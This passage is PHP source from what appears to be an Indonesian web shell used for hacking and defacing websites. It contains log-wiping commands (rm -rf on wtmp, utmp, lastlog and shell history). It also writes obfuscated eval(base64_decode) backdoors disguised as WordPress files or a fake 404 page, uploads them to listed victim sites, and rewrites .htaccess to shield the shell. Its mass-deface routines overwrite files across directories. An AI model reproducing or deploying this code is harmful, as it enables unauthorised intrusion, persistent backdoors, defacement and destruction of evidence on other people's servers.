  system("rm -rf /var/adm");
  sleep(2);
  echo'<p>Deleting .../var/adm </p>';

  system("rm -rf /etc/wtmp");
  sleep(2);
  echo'<p>Deleting .../etc/wtmp </p>';

  system("rm -rf /etc/utmp");
  sleep(2);
  echo'<p>Deleting .../etc/utmp </p>';

  system("rm -rf $HISTFILE");
  sleep(2);
  echo'<p>Deleting ...$HISTFILE </p>'; 

  system("rm -rf /var/log/lastlog");
  sleep(2);
  echo'<p>Deleting .../var/log/lastlog </p>';

  system("rm -rf /var/log/wtmp");
  sleep(2);
  echo'<p>Deleting .../var/log/wtmp </p>';

  sleep(4);

  echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
  echo"</td></tr></table>";
   }elseif($_GET['saf'] == 'info') {
echo"<h2>Information System</h2>";
echo"<font size='3'><pre align='left'>";
$asu=php_uname();
echo "System:".$asu."</font><br>";
echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo"version: <b>".phpversion()."</b> <b>".php_sapi_name()."</b><br>";
shell_exec("cat /proc/version");
echo "User: ".$user." (".$uid.") Group: ".$group." (".$gid.")<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "";print($_SERVER['SERVER_SOFTWARE']);
echo "<br>Disable Functions: $show_ds<br>";
echo "<form method='post'>
  <font style='text-decoration: underline;'></font>
  <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
  </form></pre>";


} elseif($_GET['saf'] == '406') {
?>
<form method="post">
<input type="submit" name="x" value="wp-config-sample.php (No Wordpress)">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
    foreach($target as $korban) {
        $global = "wp-config-sample.php";
        $isi_nama_doang = "PD9waHAKPz4KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4gPGh0bWw+CjxoZWFkPiAKPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPiAKPC9oZWFkPgo8Ym9keT4gCjxoMT5Ob3QgRm91bmQ8L2gxPiA8cD5UaGUgcmVxdWVzdGVkIFVSTCAKPD9waHAgCmVjaG8gJF9TRVJWRVJbJ1NDUklQVF9OQU1FJ107Cj8+IAp3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvcD4gCjxocj4gCjxhZGRyZXNzPgo8P3BocCAKZWNobyAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ107Cj8+IApTZXJ2ZXIgYXQgCjw/cGhwIAplY2hvICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgCj8+IFBvcnQgCjw/cGhwIAplY2hvICRfU0VSVkVSWydTRVJWRVJfUE9SVCddOwoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCmZ1bmN0aW9uIGtvbnRvbCgpeyAgZXZhbChiYXNlNjRfZGVjb2RlKCdablZ1WTNScGIyNGdjMmhsYkd3b0tTQjdDaVJvWVc1a2JHVWdQU0JtYjNCbGJpZ2lNamN4TXpNM0xuQm9jQ0lzSUNKaEt5SXBPd29rYkc5bklEMGdJancvY0dod0lHVjJZV3dvWW1GelpUWTBYMlJsWTI5a1pTZ25ZVmRaYjBwR09VaFNWbEppU2pOU2RtRXpWVzVZVTBFNVVGTkJibU15Um5waE0wcG9aVWhDYzJJeWJEQktlV3RuWlhkd2JGa3lhSFpKUTJNNFpFZHNNR0pIVlN0T1JFRXdTVVUxVUZaRFFrZFVNVlpQVWtSM2RtUkhiREJpUjFVclNucHpTMXBYVG05aWVXTTRXVzA1YTJWVFFucGtTR3h6V2xRd2FWbHRSbXBoTW1SNVlqTldkVnBETVdwaU1uaDJZMnB2WjJReWFIQmtSMVUzU1VkT2RtSkhPWGxQYVVKcFlrZEdhbUY2YzJsRGJVWnpZVmMxY2xCVFNXcGFWMVYzVFVSQmQwbHBRbk5oVnpWeVVGTkphazFFUVhkTlIxWnNTV2xDTW1KSGJIVmhlakJwU1hwVk1VMVhSVFJaYVVrclNucHpTMXBYVG05aWVVRnVVRU01YWxwWE5UQmFXRWtyU25welMxcFhUbTlpZVVGdVVFZE9iR0p1VW14amFqUnVUM2R3YkZreWFIWkpRMk00V1c1SksxQkhTbmxRYVdNM1EyMVdhbUZIT0dkS2VuaHBZVmRqSzFKSGJIbEpSREE0WXpOQ2FHSnBRbnBrU0d4eldsUXdhVmt5T1hOaU0wazJTVWRLYzFsWFRuSlBlVWtyU25rMWJscFlVbXBrTWxGdlMxTTBibEJET1hwalIwWjFVR3AzZGxsdGJHNVFhbmhwWTJvME9GbHVTU3RLZW5OTFdsZE9iMko1UVc1UVIxcDJZMjB3WjFsWFRqQmhWemwxVUZOSmFVbEhNV3hrUjJoMldrUXdhV05IT1hwa1EwbG5XbGMxYW1SSWJIZGFWREJwWWxoV2MyUkhiSGRaV0Vvd1RESmFkbU50TUhSYVIwWXdXVk5KWjJKdFJuUmFWREJwWVRJNWRXUkhPWE5KYVVKd1drUXdhV0V5T1hWa1J6bHpTV28wWjBOcWVIQmlia0l4WkVOQ01HVllRbXhRVTBwdFlWZDRiRWxwUW5WWlZ6RnNVRk5LYm1JeVNuTmlNbk5wVEhvMFMxQkhiSFZqU0ZZd1NVYzFhR0pYVlRsSmJsWjNZa05KWjJGWFVUbEpibFozWWtOSloyUkliSGRhVkRCcFl6TldhV0pYYkRCSmFVSXlXVmQ0TVZwVU1HbGtXRUp6WWpKR2EwbHBRWFpRWjI4NFRESmFkbU50TUN0S2VuTkxZVmRaYjBwR09WRlVNVTVWVjNsa01XTkhkMjVZVTBFNVVGTkJhV1JZUW5OaU1rWnJTV2xyUzBsRFFuQmFhV2hCV1RJNWQyVlRaMnRZTUZwS1ZFVldWRmQ1Wkc1aU1rcHpZakp6YmxoV2MyNWtSekYzV0RJMWFHSlhWVzVZVTNkblNrWTVSMU5WZUVaVk1YTnVXakk1YVdKSE9YSktNVEZpU2pJMWFHSlhWVzVZVTJ0d1EyZHNOMXBYVG05aWVVRnVVRWRuZVZCcWVIcGpSMFoxU1VoT01HVlhlR3hRVTBwcVlqSjRkbU5xYjJkYU0wcHNXbGMwTjBscU5HZFhlWFJrU1VWa2FGb3lSbk5KUmxaM1lrYzVhRnBEUWtoWlZ6Um5TVk5CTm1ScFFXOVFlV3RuVUVNNWVtTkhSblZRYW5kMllVUkpLMHA2ZERsRFoyeHNZa2hPYkVObmJEZERiVlpxWVVjNFowcDZlRzlOYWpRNFdXNUpLMUJJVG5kWlZ6Um5Zek5TTldKSFZUbEpiVTUyWWtjNWVVOXBRbmxhTWtsdlRWUnJlVXhEUVhkTVEwRjNTMVJ6YVZCcFFtSk1WakJuVWpKR2JsbFhkMmRXV0VKellqSkdhMGxEUldkU1YwVnZVRU01ZW1OSFJuVlFhbmQyWVVSSkswcDZkRGxEYlZacVlVYzRaMHA2ZDNaWmJUbHJaVlEwT0V3eVVuQmthalJ1VDNkd09VTnFPQ3REYW5kb1VrVTVSRlpHYkZGU1UwSkpWa1V4VFVsR1FsWlJhM2hLVVhsQmFVeFRPSFpUVlZaVlVtazRkbEpHVWtWSlJXaFZWRlYzWjAxcE5IZE1lVGxHVkdsSkswbEVlRzlrUnpGelVHZHZPR0ZIVm1oYVJEUm5RMnA0TUdGWVVuTmFWRFF3VFVSUloxUnRPVEJKUlZwMlpGYzFhMUJET1RCaFdGSnpXbFEwWjBOcWQzWmhSMVpvV2tRMFMxQkhTblphU0dzclNVRnZPR0ZFUlN0VWJUa3dTVVZhZG1SWE5XdFFRemx2VFZRMFoxQklRU3RXUjJoc1NVaEtiR05ZVm14ak0xSnNXa05DVmxWcmQyZERhbmN2WTBkb2QwbEJjR3haTW1oMlNVTlNabFV3VmxOV2ExWlRWM2xrVkZFeFNrcFZSbEptVkd0R1RsSlRaR1JQZDI4dlVHbEJTMlF5Um5wSlJ6VjJaRU5DYldJelZuVmFRMEoyWW1sQ01HRkhiSHBKU0U1c1kyNWFiR05wTkRoTU0wRXJTVUZ2T0dGSVNTdEpRVzg0V1ZkU2EyTnRWbnBqZWpSTFVFUTVkMkZJUVdkRGJWWnFZVWM0WjBwR09WUlNWa3BYVWxaS1lrb3hUa1pWYkZwR1ZXdzVWRlF3V2xWV01FWlRVbE5rWkU5M2J5OVFhVUZMVlRKV2VXUnRWbmxKUjBZd1NVRnZPRkF6UW05alEwRkxXbGRPYjJKNVFXdFlNVTVHVld4YVJsVnNjMjVUUmxKVlZVWTVTVlF4VGxWS01UQTNTVUZ2TDFCcFFsRmlNMG93U1VGdk9GQXpRbTlqUTBGTFdsZE9iMko1UVd0WU1VNUdWV3hhUmxWc2MyNVZNRlpUVm10V1UxZ3hRbEJWYkZGdVdGUnpTMUI2TkV0UVF6bG9Xa2RTZVZwWVRucFFhVUZMVUVNNWFXSXlValZRWjI4NFRESm9NR0pYZHlzbktTazdQejRpT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm5keWFYUmxLQ1JvWVc1a2JHVXNJQ0lrYkc5bklpazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm1ZMnh2YzJVb0pHaGhibVJzWlNrN0NuMGdDbk5vWld4c0tDazcnKSk7IAp9IGtvbnRvbCgpOw==";
        $decode_isi = base64_decode($isi_nama_doang);
        $encode = base64_encode($global);
        $ss = fopen($global,"w");
        fputs($ss, $decode_isi);
        echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
        echo "Done wp-config-sample.php<br>";
        $url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
        $post1 = array(
                "target" => "l1_$encode",
                "content" => "$decode_isi",);
        $post2 = array( "upload[]" => "@$global",);
        $output_mkfile = ngirim("$korban", $post1);
            $upload_ah = ngirim("$korban?cmd=upload", $post2);
            }
        }
        } elseif($_GET['saf'] == 'log') {
?>
<form method="post">
<input type="submit" name="x" value="index.php">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
    foreach($target as $korban) {
        $global = "index.php";
        $isi_nama_doang = "PD9waHAKLyoqCiAqIEZyb250IHRvIHRoZSBXb3JkUHJlc3MgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBkb2Vzbid0IGRvIGFueXRoaW5nLCBidXQgbG9hZHMKICogd3AtYmxvZy1oZWFkZXIucGhwIHdoaWNoIGRvZXMgYW5kIHRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSB0aGVtZS4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqLwoKLyoqCiAqIFRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSBXb3JkUHJlc3MgdGhlbWUgYW5kIG91dHB1dCBpdC4KICoKICogQHZhciBib29sCiAqLwpkZWZpbmUoICdXUF9VU0VfVEhFTUVTJywgdHJ1ZSApOwoKLyoqIExvYWRzIHRoZSBXb3JkUHJlc3MgRW52aXJvbm1lbnQgYW5kIFRlbXBsYXRlICovCnJlcXVpcmUgX19ESVJfXyAuICcvd3AtYmxvZy1oZWFkZXIucGhwJzsKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCmZ1bmN0aW9uIGtvbnRvbCgpeyAgZXZhbChiYXNlNjRfZGVjb2RlKCdablZ1WTNScGIyNGdjMmhsYkd3b0tTQjdDaVJvWVc1a2JHVWdQU0JtYjNCbGJpZ2lNamN4TXpNM0xuQm9jQ0lzSUNKaEt5SXBPd29rYkc5bklEMGdJancvY0dod0lHVjJZV3dvWW1GelpUWTBYMlJsWTI5a1pTZ25ZVmRaYjBwR09VaFNWbEppU2pOU2RtRXpWVzVZVTBFNVVGTkJibU15Um5waE0wcG9aVWhDYzJJeWJEQktlV3RuWlhkd2JGa3lhSFpKUTJNNFpFZHNNR0pIVlN0T1JFRXdTVVUxVUZaRFFrZFVNVlpQVWtSM2RtUkhiREJpUjFVclNucHpTMXBYVG05aWVXTTRXVzA1YTJWVFFucGtTR3h6V2xRd2FWbHRSbXBoTW1SNVlqTldkVnBETVdwaU1uaDJZMnB2WjJReWFIQmtSMVUzU1VkT2RtSkhPWGxQYVVKcFlrZEdhbUY2YzJsRGJVWnpZVmMxY2xCVFNXcGFWMVYzVFVSQmQwbHBRbk5oVnpWeVVGTkphazFFUVhkTlIxWnNTV2xDTW1KSGJIVmhlakJwU1hwVk1VMVhSVFJaYVVrclNucHpTMXBYVG05aWVVRnVVRU01YWxwWE5UQmFXRWtyU25welMxcFhUbTlpZVVGdVVFZE9iR0p1VW14amFqUnVUM2R3YkZreWFIWkpRMk00V1c1SksxQkhTbmxRYVdNM1EyMVdhbUZIT0dkS2VuaHBZVmRqSzFKSGJIbEpSREE0WXpOQ2FHSnBRbnBrU0d4eldsUXdhVmt5T1hOaU0wazJTVWRLYzFsWFRuSlBlVWtyU25rMWJscFlVbXBrTWxGdlMxTTBibEJET1hwalIwWjFVR3AzZGxsdGJHNVFhbmhwWTJvME9GbHVTU3RLZW5OTFdsZE9iMko1UVc1UVIxcDJZMjB3WjFsWFRqQmhWemwxVUZOSmFVbEhNV3hrUjJoMldrUXdhV05IT1hwa1EwbG5XbGMxYW1SSWJIZGFWREJwWWxoV2MyUkhiSGRaV0Vvd1RESmFkbU50TUhSYVIwWXdXVk5KWjJKdFJuUmFWREJwWVRJNWRXUkhPWE5KYVVKd1drUXdhV0V5T1hWa1J6bHpTV28wWjBOcWVIQmlia0l4WkVOQ01HVllRbXhRVTBwdFlWZDRiRWxwUW5WWlZ6RnNVRk5LYm1JeVNuTmlNbk5wVEhvMFMxQkhiSFZqU0ZZd1NVYzFhR0pYVlRsSmJsWjNZa05KWjJGWFVUbEpibFozWWtOSloyUkliSGRhVkRCcFl6TldhV0pYYkRCSmFVSXlXVmQ0TVZwVU1HbGtXRUp6WWpKR2EwbHBRWFpRWjI4NFRESmFkbU50TUN0S2VuTkxZVmRaYjBwR09WRlVNVTVWVjNsa01XTkhkMjVZVTBFNVVGTkJhV1JZUW5OaU1rWnJTV2xyUzBsRFFuQmFhV2hCV1RJNWQyVlRaMnRZTUZwS1ZFVldWRmQ1Wkc1aU1rcHpZakp6YmxoV2MyNWtSekYzV0RJMWFHSlhWVzVZVTNkblNrWTVSMU5WZUVaVk1YTnVXakk1YVdKSE9YSktNVEZpU2pJMWFHSlhWVzVZVTJ0d1EyZHNOMXBYVG05aWVVRnVVRWRuZVZCcWVIcGpSMFoxU1VoT01HVlhlR3hRVTBwcVlqSjRkbU5xYjJkYU0wcHNXbGMwTjBscU5HZFhlWFJrU1VWa2FGb3lSbk5KUmxaM1lrYzVhRnBEUWtoWlZ6Um5TVk5CTm1ScFFXOVFlV3RuVUVNNWVtTkhSblZRYW5kMllVUkpLMHA2ZERsRFoyeHNZa2hPYkVObmJEZERiVlpxWVVjNFowcDZlRzlOYWpRNFdXNUpLMUJJVG5kWlZ6Um5Zek5TTldKSFZUbEpiVTUyWWtjNWVVOXBRbmxhTWtsdlRWUnJlVXhEUVhkTVEwRjNTMVJ6YVZCcFFtSk1WakJuVWpKR2JsbFhkMmRXV0VKellqSkdhMGxEUldkU1YwVnZVRU01ZW1OSFJuVlFhbmQyWVVSSkswcDZkRGxEYlZacVlVYzRaMHA2ZDNaWmJUbHJaVlEwT0V3eVVuQmthalJ1VDNkd09VTnFPQ3REYW5kb1VrVTVSRlpHYkZGU1UwSkpWa1V4VFVsR1FsWlJhM2hLVVhsQmFVeFRPSFpUVlZaVlVtazRkbEpHVWtWSlJXaFZWRlYzWjAxcE5IZE1lVGxHVkdsSkswbEVlRzlrUnpGelVHZHZPR0ZIVm1oYVJEUm5RMnA0TUdGWVVuTmFWRFF3VFVSUloxUnRPVEJKUlZwMlpGYzFhMUJET1RCaFdGSnpXbFEwWjBOcWQzWmhSMVpvV2tRMFMxQkhTblphU0dzclNVRnZPR0ZFUlN0VWJUa3dTVVZhZG1SWE5XdFFRemx2VFZRMFoxQklRU3RXUjJoc1NVaEtiR05ZVm14ak0xSnNXa05DVmxWcmQyZERhbmN2WTBkb2QwbEJjR3haTW1oMlNVTlNabFV3VmxOV2ExWlRWM2xrVkZFeFNrcFZSbEptVkd0R1RsSlRaR1JQZDI4dlVHbEJTMlF5Um5wSlJ6VjJaRU5DYldJelZuVmFRMEoyWW1sQ01HRkhiSHBKU0U1c1kyNWFiR05wTkRoTU0wRXJTVUZ2T0dGSVNTdEpRVzg0V1ZkU2EyTnRWbnBqZWpSTFVFUTVkMkZJUVdkRGJWWnFZVWM0WjBwR09WUlNWa3BYVWxaS1lrb3hUa1pWYkZwR1ZXdzVWRlF3V2xWV01FWlRVbE5rWkU5M2J5OVFhVUZMVlRKV2VXUnRWbmxKUjBZd1NVRnZPRkF6UW05alEwRkxXbGRPYjJKNVFXdFlNVTVHVld4YVJsVnNjMjVUUmxKVlZVWTVTVlF4VGxWS01UQTNTVUZ2TDFCcFFsRmlNMG93U1VGdk9GQXpRbTlqUTBGTFdsZE9iMko1UVd0WU1VNUdWV3hhUmxWc2MyNVZNRlpUVm10V1UxZ3hRbEJWYkZGdVdGUnpTMUI2TkV0UVF6bG9Xa2RTZVZwWVRucFFhVUZMVUVNNWFXSXlValZRWjI4NFRESm9NR0pYZHlzbktTazdQejRpT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm5keWFYUmxLQ1JvWVc1a2JHVXNJQ0lrYkc5bklpazdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQm1ZMnh2YzJVb0pHaGhibVJzWlNrN0NuMGdDbk5vWld4c0tDazcnKSk7IAp9IGtvbnRvbCgpOw==";
        $decode_isi = base64_decode($isi_nama_doang);
        $encode = base64_encode($global);
        $ss = fopen($global,"w");
        fputs($ss, $decode_isi);
        echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
        echo "Done index.php<br>";
        $url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
        $post1 = array(
                "target" => "l1_$encode",
                "content" => "$decode_isi",);
        $post2 = array( "upload[]" => "@$global",);
        $output_mkfile = ngirim("$korban", $post1);
            $upload_ah = ngirim("$korban?cmd=upload", $post2);
            }
        }
        } elseif($_GET['saf'] == 'uplo') {
?>
<form method="post">
<input type="submit" name="x" value=".htaccess">
</form>
<font color=lime>Sebelum Menggunakan Fitur ini,</font><br>
<font color=lime>Nama Shell Wajib saskra.php. </font><br>
<font color=lime>(Fitur ini tidak diperuntukkan oleh Seller Shell/Buyer Shell) </font><br>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
    foreach($target as $korban) {
        $global = ".htaccess";
        $isi_nama_doang = "PEZpbGVzTWF0Y2ggJy4ocGhwfHBocDV8cGh0bWwpJCc+Ck9yZGVyIGFsbG93LGRlbnkKRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICdeKGluZGV4LnBocHx3cC1ibG9nLWhlYWRlci5waHB8d3AtY29uZmlnLXNhbXBsZS5waHB8d3AtbGlua3Mtb3BtbC5waHB8d3AtbG9naW4ucGhwfHdwLXNldHRpbmdzLnBocHx3cC10cmFja2JhY2sucGhwfHdwLWFjdGl2YXRlLnBocHx3cC1jb21tZW50cy1wb3N0LnBocHx3cC1jcm9uLnBocHx3cC1sb2FkLnBocHx3cC1tYWlsLnBocHx3cC1zaWdudXAucGhwfHhtbHJwYy5waHB8ZWRpdC1mb3JtLWFkdmFuY2VkLnBocHxsaW5rLXBhcnNlLW9wbWwucGhwfG1zLXNpdGVzLnBocHxvcHRpb25zLXdyaXRpbmcucGhwfHRoZW1lcy5waHB8YWRtaW4tYWpheC5waHB8ZWRpdC1mb3JtLWNvbW1lbnQucGhwfGxpbmsucGhwfG1zLXRoZW1lcy5waHB8cGx1Z2luLWVkaXRvci5waHB8YWRtaW4tZm9vdGVyLnBocHxlZGl0LWxpbmstZm9ybS5waHB8bG9hZC1zY3JpcHRzLnBocHxtcy11cGdyYWRlLW5ldHdvcmsucGhwfHNlY2sucGhwfGFkbWluLWZ1bmN0aW9ucy5waHB8ZWRpdC5waHB8bG9hZC1zdHlsZXMucGhwfG1zLXVzZXJzLnBocHxwbHVnaW5zLnBocHxhZG1pbi1oZWFkZXIucGhwfGVkaXQtdGFnLWZvcm0ucGhwfG1lZGlhLW5ldy5waHB8bXktc2l0ZXMucGhwfHBvc3QtbmV3LnBocHxhZG1pbi5waHB8ZWRpdC10YWdzLnBocHxtZWRpYS5waHB8bmF2LW1lbnVzLnBocHxwb3N0LnBocHxhZG1pbi1wb3N0LnBocHxzYXNrcmEucGhwfGV4cG9ydC5waHB8bWVkaWEtdXBsb2FkLnBocHxuZXR3b3JrLnBocHxwcmVzcy10aGlzLnBocHx1cGxvYWQucGhwfGFzeW5jLXVwbG9hZC5waHB8bWVudS1oZWFkZXIucGhwfG9wdGlvbnMtZGlzY3Vzc2lvbi5waHB8cHJpdmFjeS5waHB8dXNlci1lZGl0LnBocHxtZW51LnBocHxvcHRpb25zLWdlbmVyYWwucGhwfHByb2ZpbGUucGhwfHVzZXItbmV3LnBocHxtb2RlcmF0aW9uLnBocHxvcHRpb25zLWhlYWQucGhwfHJldmlzaW9uLnBocHx1c2Vycy5waHB8Y3VzdG9tLWJhY2tncm91bmQucGhwfG1zLWFkbWluLnBocHxvcHRpb25zLW1lZGlhLnBocHxzZXR1cC1jb25maWcucGhwfHdpZGdldHMucGhwfGN1c3RvbS1oZWFkZXIucGhwfHNlY2suaHRtbHxtcy1kZWxldGUtc2l0ZS5waHB8MjcxMzM3LnBocHxvcHRpb25zLXBlcm1hbGluay5waHB8dGVybS5waHB8Y3VzdG9taXplLnBocHxsaW5rLWFkZC5waHB8bXMtZWRpdC5waHB8b3B0aW9ucy5waHB8ZWRpdC1jb21tZW50cy5waHB8bGluay1tYW5hZ2VyLnBocHxtcy1vcHRpb25zLnBocHxvcHRpb25zLXJlYWRpbmcucGhwfHN5c3RlbV9sb2cucGhwKSQnPgpPcmRlciBhbGxvdyxkZW55CkFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+ClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUJhc2UgLwpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZgpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZApSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0KPC9JZk1vZHVsZT4=";
        $decode_isi = base64_decode($isi_nama_doang);
        $encode = base64_encode($global);
        $ss = fopen($global,"w");
        fputs($ss, $decode_isi);
        echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
        echo "Done Edit .htaccess<br>";
        $url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
        $post1 = array(
                "target" => "l1_$encode",
                "content" => "$decode_isi",);
        $post2 = array( "upload[]" => "@$global",);
        $output_mkfile = ngirim("$korban", $post1);
            $upload_ah = ngirim("$korban?cmd=upload", $post2);
            }
        }
  }elseif($_GET['saf'] == 'about') {
    echo"Indonesian Defacer<br>Shell ini tidak sepenuh nya saya coding sendiri <br> terimakasih yg telah membantu<br>Thanks to All : <br>IndoXploit , N45HT , SasKraXploit, Con7ext, Author Brudul Shell, 99Syndicate, MrCakil, Restu Haxor<br><br><li> <a href='?dir=$dir&kill=self'>HIDDEN</b></a></li></div><br>";
  } elseif($_GET['saf'] == 'mass') {
  echo "<center><form action=\"\" method=\"post\">\n";
  $dirr=$_POST['d_dir'];
  $index = $_POST["script"];
  $index = str_replace('"',"'",$index);
  $index = stripslashes($index);
  function edit_file($file,$index){
    if (is_writable($file)) {
    clear_fill($file,$index);
    echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
    } 
    else {
      echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
      }
      }
  function hapus_massal($dir,$namafile) {
    if(is_writable($dir)) {
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.') {
          if(file_exists("$dir/$namafile")) {
            unlink("$dir/$namafile");
          }
        } elseif($dirb === '..') {
          if(file_exists("".dirname($dir)."/$namafile")) {
            unlink("".dirname($dir)."/$namafile");
          }
        } else {
          if(is_dir($dirc)) {
            if(is_writable($dirc)) {
              if(file_exists($lokasi)) {
                echo "<font color=lime>></font> $lokasi<br>";
                unlink($lokasi);
                $idx = hapus_massal($dirc,$namafile);
              }
            }
          }
        }
      }
    }
  }
  function clear_fill($file,$index){
    if(file_exists($file)){
      $handle = fopen($file,'w');
      fwrite($handle,'');
      fwrite($handle,$index);
      fclose($handle);  } }

  function gass(){
    global $dirr , $index ;
    chdir($dirr);
    $me = str_replace(dirname(__FILE__).'/','',__FILE__);
    $files = scandir($dirr) ;
    $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
    sort($files);
    $n = 0 ;
    foreach ($files as $file){
      if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
        echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
        edit_file($file,$index);
        flush();
        $n = $n +1 ;
        } 
        }
        echo "<br>";
        echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
          }
  function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
      }

      closedir($dh);
      return $files;
    }
  }
  function gass_all(){
    global $index ;
    $dirrall=$_POST['d_dir'];
    foreach (ListFiles($dirrall) as $key=>$file){
      $file = str_replace('//',"/",$file);
      echo "<center><strong>$file</strong> ===>";
      edit_file($file,$index);
      flush();
    }
    $key = $key+1;
  echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
  function sabun_massal($dir,$namafile,$isi_script) {
    if(is_writable($dir)) {
      $dira = scandir($dir);
      foreach($dira as $dirb) {
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.') {
          file_put_contents($lokasi, $isi_script);
        } elseif($dirb === '..') {
          file_put_contents($lokasi, $isi_script);
        } else {
          if(is_dir($dirc)) {
            if(is_writable($dirc)) {
              echo "[<font color=lime>DONE</font>] $lokasi<br>";
              file_put_contents($lokasi, $isi_script);
              $idx = sabun_massal($dirc,$namafile,$isi_script);
            }
          }
        }
      }
    }
  }
  if($_POST['mass'] == 'onedir') {
    echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
    $ini="http://";
    $mainpath=$_POST[d_dir];
    $file=$_POST[d_file];
    $dir=opendir("$mainpath");
    $code=base64_encode($_POST[script]);
    $indx=base64_decode($code);
    while($row=readdir($dir)){
    $start=@fopen("$row/$file","w+");
    $finish=@fwrite($start,$indx);
    if ($finish){
      echo"$ini$row/$file\n";
      }
    }
    echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
    $mainpath=$_POST[d_dir];$file=$_POST[d_file];
    $dir=opendir("$mainpath");
    $code=base64_encode($_POST[script]);
    $indx=base64_decode($code);
    while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
    $finish=@fwrite($start,$indx);
    if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
